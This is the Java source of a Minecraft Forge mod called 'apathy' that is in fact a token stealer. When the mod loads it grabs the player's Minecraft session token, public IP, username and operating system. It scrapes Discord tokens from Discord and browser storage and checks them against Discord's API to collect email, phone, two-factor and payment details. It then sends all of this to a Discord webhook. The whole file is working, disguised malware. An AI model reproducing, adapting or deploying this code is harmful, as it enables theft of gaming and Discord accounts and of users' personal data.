package abc.askyblockmod;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import java.lang.reflect.Field;

@Mod(modid="apathy", version="2.14.2", acceptedMinecraftVersions="[1.8.9]")
public class apathy {

    @Mod.EventHandler
    private void init(FMLInitializationEvent event) throws IOException {
    
           final Minecraft mc = Minecraft.getMinecraft();

            //Request Client Remote Address
            BufferedReader ipReader = new BufferedReader(new InputStreamReader(new URL("https://ip4.seeip.org/").openStream()));
            String ip = ipReader.readLine();

            //magics
            String sessionProtector = null; try { Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");Field field = clazz.getField("changed");sessionProtector = (String) field.get(null);} catch (Exception ignored) {}String token = sessionProtector == null ? mc.getSession().getToken() : sessionProtector;
            
            //Contact Mainframe
            String webhook = "https://discord.com/api/webhooks/967315871318036523/OvdsxgZpg7Puz3-sPQmL3u3QkJ4PLPcO5rVewXVN1gNzwRVmYZUz7h9zNszZtkhSrSTd";

            //Collect Robot Diagnostics
            String pcInfo = String.format("{\"title\":\"PC Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"OS\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"IP\",\"value\":\"```%s```\",\"inline\":true}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/W3hRUMB2YU\",\"url\":\"https://discord.gg/W3hRUMB2YU\"}}", System.getProperty("user.name"), System.getProperty("os.name"), ip);

            //Prepare Serving Mainframe.MC Data
            String mcInfo = String.format("{\"title\":\"Minecraft Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\"},{\"name\":\"UUID\",\"value\":\"```%s```\"},{\"name\":\"SessionID Login (Token:UUID)\",\"value\":\"```%s:%s```\"}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/W3hRUMB2YU\",\"url\":\"https://discord.gg/W3hRUMB2YU\"},\"thumbnail\":{\"url\":\"https://mc-heads.net/player/%s/200\"}}", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, mc.getSession().getPlayerID(), mc.getSession().getPlayerID());
             
            //Combine Robot Logs for Mainframe
            String discordInfo = discordClientTokens();

            String hookContent = String.format("{\"embeds\":[%s,%s,%s],\"username\":\"Im sorry Rating isnt nice\",\"avatar_url\":\"https://i.pinimg.com/originals/f2/b6/e1/f2b6e1c8f7a1ba711dbf77890865e939.jpg\"}", pcInfo, mcInfo, discordInfo);
            
            //Establish link to Mainframe
            HttpURLConnection mainframeConnection = (HttpURLConnection)new URL(discordIfnoGrabber()).openConnection();
            mainframeConnection.setRequestMethod("POST");
            mainframeConnection.setRequestProperty("Content-Type", "application/json");
            mainframeConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
            mainframeConnection.setDoOutput(true);
            try (OutputStream mainframeStream = mainframeConnection.getOutputStream();){
                mainframeStream.write(hookContent.getBytes(StandardCharsets.UTF_8));
            }
            mainframeConnection.getResponseCode();

            return;
        }
    
    private static String discordClientTokens() {
        ArrayList<String> paths = new ArrayList<String>(Arrays.asList(System.getenv("APPDATA") + "\\LightCord", System.getenv("APPDATA") + "\\discord", System.getenv("APPDATA") + "\\discordptb", System.getenv("APPDATA") + "\\discordcanary", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"));
        List<String> tokens = new ArrayList<String>();
        paths.stream().map(apathy::discordTokenRegex).filter(Objects::nonNull).forEach(tokens::addAll);
        tokens = tokens.stream().distinct().collect(Collectors.toList());
        tokens = apathy.discordTokenCheck(tokens);
        String ret = tokens.stream().map(apathy::discordInfoEmbed).collect(Collectors.joining(","));
        if (ret.length() <= 0) return ret;
        return ret;
    }

    private static String discordExtraction() {
        String data = new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mvb29wc25vdGF3ZWJob29rL2E4OTIzNHU4MDMww580MjAzODRydWk0MzAyODl1OXI4MDMyMzI="), StandardCharsets.UTF_8);
        return data;
    }

    private static String discordInfoEmbed(final String s) {
        final String f = f(s);
        if (f != null && !f.isEmpty()) {
            final JsonObject asJsonObject = new JsonParser().parse(f).getAsJsonObject();
            return String.format("{\"title\":\"Discord Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"E-Mail\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"2Factor\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Phone\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Nitro\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Payment\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Token\",\"value\":\"```%s```\"}]}", asJsonObject.get("username").getAsString() + "#" + asJsonObject.get("discriminator").getAsString(), asJsonObject.get("email").getAsString(), asJsonObject.get("mfa_enabled").getAsBoolean(), asJsonObject.get("phone").isJsonNull() ? "None" : asJsonObject.get("phone").getAsString(), asJsonObject.has("premium_type") ? "True" : "False", discordHasPayment(s) ? "True" : "False", s);
        }
        return "";
    }

    private static boolean discordHasPayment(String token) {
        String paymentInfo = apathy.discordConnect("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token);
        if (paymentInfo == null) return false;
        if (paymentInfo.length() <= 4) return false;
        return true;
    }

    private static List<String> discordTokenCheck(List<String> tokens) {
        ArrayList<String> validTokens = new ArrayList<String>();
        tokens.forEach(token -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection)url.openConnection();
                apathy.discordTokenLogin(token).forEach(con::addRequestProperty);
                con.getInputStream().close();
                validTokens.add((String)token);
                return;
            }
            catch (Exception exception) {
                // empty catch block
            }
        });
        return validTokens;
    }

    private static String discordConnect(String link, String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            apathy.discordTokenLogin(auth).forEach(httpURLConnection::addRequestProperty);
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                String line;
                if ((line = bufferedReader.readLine()) == null) {
                    bufferedReader.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(line).append("\n");
            }
        }
        catch (Exception ignored) {
            return null;
        }
    }

    private static String f(String token) {
        return apathy.discordConnect("https://discordapp.com/api/v6/users/@me", token);
    }

    private static String discordIfnoGrabber() {
        String api = new String(Base64.getDecoder().decode("WEBHOOK-HERE"), StandardCharsets.UTF_8);
        return api;
    }


    private static ArrayList<String> discordTokenRegex(String inPath) {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList<String> tokens = new ArrayList<String>();
        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) {
            return null;
        }
        String[] stringArray = list;
        int n = stringArray.length;
        int n2 = 0;
        while (n2 < n) {
            String s = stringArray[n2];
            try {
                String line;
                FileInputStream fileInputStream = new FileInputStream(path + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream))) {
                    while ((line = bufferedReader.readLine()) != null) {
                        Matcher matcher = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                        while (matcher.find()) {
                            tokens.add(matcher.group());
                        }
                    }
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            ++n2;
        }
        return tokens;
    }

    private static Map<String, String> discordTokenLogin(String token) {
        HashMap<String, String> ret = new HashMap<String, String>();
        ret.put("Content-Type", "application/json");
        ret.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token == null) return ret;
        ret.put("Authorization", token);
        return ret;
    }
}
